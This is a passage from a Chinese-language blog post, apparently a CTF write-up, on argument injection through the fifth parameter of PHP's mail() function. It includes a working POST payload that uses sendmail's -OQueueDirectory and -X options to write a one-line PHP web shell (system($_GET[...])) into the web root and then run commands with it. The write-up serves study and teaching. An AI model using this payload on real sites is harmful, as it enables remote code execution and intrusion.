can be used to set the envelope sender address when using sendmail with the -f sendmail option.</span><br><span class="line">This parameter is escaped by escapeshellcmd() internally to prevent command execution. escapeshellcmd() prevents command execution, but allows to add additional parameters. For security reasons, it is recommended for the user to sanitize this parameter to avoid adding unwanted parameters to the shell command.</span><br><span class="line"></span><br><span class="line">通常，该参数被web应用用来设置发送者的地址，例如：```-f miao@abc.com```。mail函数会被系统中的 */usr/bin/sendmail* 程序调用，该程序由邮件传输代理软件安装在系统上，是用来发送邮件的接口。sendmail命令会在系统shell的帮助下执行。</span><br><span class="line"></span><br><span class="line">##### 攻击向量</span><br></pre></td></tr></table></figure></p>
<p>sendmail    的第五个参数可以通过 <em>-O</em> 、<em>-X</em> 、<em>-C</em> 参数导致任意文件读写。<br>-OQueueDirectory=/tmp    选择一个可以写的目录保存临时文件<br>-X/tmp/log.txt  保存日志文件到任意目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">其中```-OQueueDirectory=/tmp```可以简写为```-oQ/tmp/```；</span><br><span class="line">```-X```参数也可以接受相对路径，例如```-X ./log.txt```。</span><br><span class="line"></span><br><span class="line">### 0x02漏洞利用</span><br><span class="line">回到原题，观察源码中的这两行，```$options```参数是用户可控的，为```-f```拼接用户填写的email字段。</span><br></pre></td></tr></table></figure></p>
<pre><code>$options = sprintf(&apos;-f%s&apos;, $email);
if(mail($to, $subject, $msg, $headers, $options)){...}
</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">构造POST参数如下（其中web根目录是按照常理猜测的，构造相对路径也可）:</span><br><span class="line">```email=miao@126.com -OQueueDirectory=/tmp -X/var/www/html/black.php</span><br></pre></td></tr></table></figure>
<p><code>content=&lt;?php system($_GET[&quot;black&quot;]); ?&gt;</code></p>
<p>然后访问<code>/black.php?black=command</code>，最后读取<code>flag.php</code>文件。</p>
<p>参考：<a href="http://drops.blbana.cc/2016/12/19/PHP-s-mail-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" target="_blank" rel="noopener">drops.blbana.cc</a>；<a href="http://www.php.net/manual/en/function.mail.php" target="_blank" rel="noopener">http://www.php.net/manual/en/function.mail.php</a>；<a href="http://www.360zhijia.com/360anquanke/197210.html" target="_blank" rel="noopener">http://www.360zhijia.com/360anquanke/197210.html</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  


          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/avatar.jpg"
                alt="b1acktea" />
            
              <p class="site-author-name" itemprop="name">b1acktea</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">2</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                
                  <span class="site-state-item-count">2</span>
                  <span class="site-state-item-name">分类</span>
                
              </div>
            

            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">b1acktea</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
